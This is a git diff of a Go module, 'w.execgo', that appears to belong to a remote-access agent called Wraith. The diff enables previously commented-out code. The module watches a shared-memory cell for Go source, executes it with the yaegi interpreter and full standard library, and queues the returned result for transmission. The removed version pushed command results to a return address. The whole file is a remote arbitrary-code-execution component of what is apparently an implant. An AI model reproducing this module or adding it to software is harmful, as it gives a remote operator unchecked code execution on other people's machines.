@@ -1,69 +1,88 @@
 package stdmod
 
-/*
 import (
 	"context"
 	"fmt"
+	"sync"
 
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
-
 	"github.com/traefik/yaegi/interp"
 	"github.com/traefik/yaegi/stdlib"
 )
 
-type ExecGoModule struct{}
+const (
+	ExecGoModule_SHM_EXECUTE = "w.execgo.execute"
+)
+
+type ExecGoModule struct {
+	mutex sync.Mutex
+}
 
 func (m *ExecGoModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error {
-	// Store results of command
-	var result string
+	// Ensure this instance is only started once and mark as running if so
+	single := m.mutex.TryLock()
+	if !single {
+		return fmt.Errorf("already running")
+	}
+	defer m.mutex.Unlock()
 
+	// Watch a memory cell for stuff to execute
+	execCellWatch, execCellWatchId := w.SHMWatch(ExecGoModule_SHM_EXECUTE)
+
+	// Always cleanup SHM when exiting
 	defer func() {
-		// Always catch panics from here as no error should crash Wraith
-		if r := recover(); r != nil {
-			result = fmt.Sprintf("command execution panicked with message: %s", r)
-		}
-
-		// Send off results if address and encoding is set
-		if addrIface, exists := hkvs.Get("return.addr"); exists {
-			if addr, ok := addrIface.(string); ok {
-				if encodeIface, exists := hkvs.Get("return.encode"); exists {
-					if encode, ok := encodeIface.(string); ok {
-						m.w.PushTx(libwraith.TxQueueElement{
-							Addr:     addr,
-							Encoding: encode,
-							Data: map[string]interface{}{
-								"cmd.result": result,
-							},
-						})
-					}
-				}
-			}
-		}
+		// Unwatch cells
+		w.SHMUnwatch(ExecGoModule_SHM_EXECUTE, execCellWatchId)
 	}()
 
-	// Initialise yaegi to handle commands
-	i := interp.New(interp.Options{})
-	i.Use(stdlib.Symbols)
-	// The code should generate a function called "wcmd" to be executed by Wraith.
-	// That function should in turn return a string to be used as the result.
-	// If the value of the key cmd is not a string, the panic will be caught and
-	// returned as the command result.
-	_, err := i.Eval(data.(string))
-	if err != nil {
-		panic(err)
+	// Mainloop
+	for {
+		select {
+		// Trigger exit when requested
+		case <-ctx.Done():
+			return nil
+		// Manage w.debug watch
+		case value := <-execCellWatch:
+			// Make sure the value is a string. If not, ignore it.
+			code, ok := value.(string)
+			if !ok {
+				continue
+			}
+
+			// Initialise yaegi to handle commands
+			i := interp.New(interp.Options{})
+			i.Use(stdlib.Symbols)
+
+			// The code should generate a function called "f" to be executed.
+			// That function should return some value which is used as the result. If no
+			// result is to be returned, the function should return `nil`.
+			_, err := i.Eval(code)
+			if err != nil {
+				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("w.execgo error while evaluating code: %w", err))
+				continue
+			}
+
+			fnv, err := i.Eval("f")
+			if err != nil {
+				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("w.execgo error while evaluating f: %w", err))
+				continue
+			}
+
+			fn, ok := fnv.Interface().(func() any)
+			if !ok {
+				w.SHMSet(libwraith.SHM_ERRS, fmt.Errorf("w.execgo f has incorrect type"))
+				continue
+			}
+
+			// Execute the function and send the result if one is returned
+			result := fn()
+			if result != nil {
+				w.SHMSet(libwraith.SHM_TX_QUEUE, result)
+			}
+		}
 	}
-	fnv, err := i.Eval("f")
-	if err != nil {
-		panic(err)
-	}
-	fn, ok := fnv.Interface().(func() string)
-	if !ok {
-		panic("f is not a `func() string`")
-	}
-	result = fn()
 }
 
 func (m *ExecGoModule) WraithModuleName() string {
 	return "w.execgo"
 }
-*/
